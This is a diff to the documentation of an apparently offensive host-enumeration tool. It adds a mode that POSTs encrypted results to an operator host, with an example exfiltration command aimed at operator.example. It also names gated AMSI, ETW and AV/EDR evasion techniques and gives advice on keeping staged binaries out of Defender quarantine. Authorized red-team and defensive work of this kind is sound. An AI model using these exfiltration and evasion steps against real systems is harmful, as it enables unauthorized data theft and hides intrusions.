@@ -25,7 +25,7 @@ the subcommand. Host-enumerating commands—including `list-plugins`, `enum`,
 | `--key-output-path PATH` | Protected key destination required for encrypted file/remote output; env: `STEALTHY_KEY_OUTPUT_PATH` | None |
 | `--plaintext-file` | Write JSON instead of an encrypted file | Off |
 | `--also-markdown` | Write `PATH.md` beside a file output | Off |
-| `--exfil-url URL` | Operator-controlled destination metadata for remote output | None |
+| `--exfil-url URL` | Absolute HTTPS destination for encrypted remote output | None |
 | `--profile quiet\|balanced\|thorough\|ci` | Named OPSEC / engagement posture (explicit flags override) | `balanced` |
 | `--plugin-timeout-ms N` | Per-plugin timeout; `0` disables | Profile default |
 | `--max-scan-seconds N` | Total scan duration limit; `0` disables | `1800` |
@@ -160,9 +160,9 @@ cannot be mistaken for a clean result.
   **Evasion techniques** (`amsi-bypass`, `etw-unhook`, `av-edr-service`) require
   `--confirm-evasion` (or `STEALTHY_EVASION_CONFIRMED=1`) in addition to
   `--authorized` and `--allow-techniques`. Even with all gates, they emit
-  `scaffold` findings only. Dormant source prototypes are not declared,
-  compiled, dispatched, or packaged, so no runtime path executes AMSI, ETW,
-  or AV/EDR interference. See `docs/techniques.md` and `docs/evasion.md`.
+  `scaffold` findings only. The corresponding Rust modules are compiled,
+  status-only gate implementations with tests; they contain no AMSI, ETW, or
+  AV/EDR interference path. See `docs/techniques.md` and `docs/evasion.md`.
 - `--plugins`: runs the listed IDs; unknown IDs fail.
 - `--skip`: excludes the listed IDs; unknown IDs fail.
 - `--triage` / `--triage-out` / `--approve-file`: stepwise operator approval for probes.
@@ -321,11 +321,20 @@ stealthy one-liners --os linux --transport ssh
 Operator-workstation delivery helpers (no host enumeration; no auth gate).
 `stage` also emits `scripts/run.sh` or `scripts/run.ps1` and a
 `stealthy-run.conf` dispatcher manifest describing the approved fallback path.
+When `--binary` is omitted, `stage` creates an explicit `bundle_mode=script-only`
+bundle: no file is written under the primary binary name, `primary_binary` is
+empty, and `SHA256SUMS` states that there is no primary binary. With `--binary`,
+the manifest records `bundle_mode=native-with-fallbacks` and the checksum file
+contains the primary binary digest.
 The manifest is not authorization evidence: the dispatcher requires a fresh
 `--authorized` flag or `STEALTHY_AUTHORIZED=1` at execution time. It binds to
 the current host, tries the primary executable, and walks only the
 manifest-approved fallback list after a launch failure (Windows default:
 `powershell,jscript,msbuild`; Linux default: `python,bash,sh,perl`).
+Windows bundles also declare the separately reviewed
+`windows-evasion-scaffolds` feature. It is not part of dispatcher fallback
+selection and reports planned/not-executed status only after all three evasion
+gates pass.
 
 On Windows, prefer staging outside `%TEMP%` — Defender often quarantines freshly
 copied unsigned PEs there. Org Authenticode signing (external to this tool)
@@ -397,9 +406,10 @@ must be approved by the evidence policy.
 stealthy --authorized --output remote --exfil-url https://operator.example/ingest --key-output-path /approved/keys/remote.key enum
 ```
 
-Remote mode is operator-controlled. The tool prints the sealed body and
-destination instructions; it does not implement a silent background client.
-It writes the key only to the protected key path.
+Remote mode requires `curl` and an absolute HTTPS URL. It POSTs the encrypted
+body from standard input, accepts only a 2xx response, and treats client,
+connection, timeout, and HTTP failures as command failures. It writes the key
+only to the protected key path and never includes the body in process arguments.
 
 ## Exit codes
 
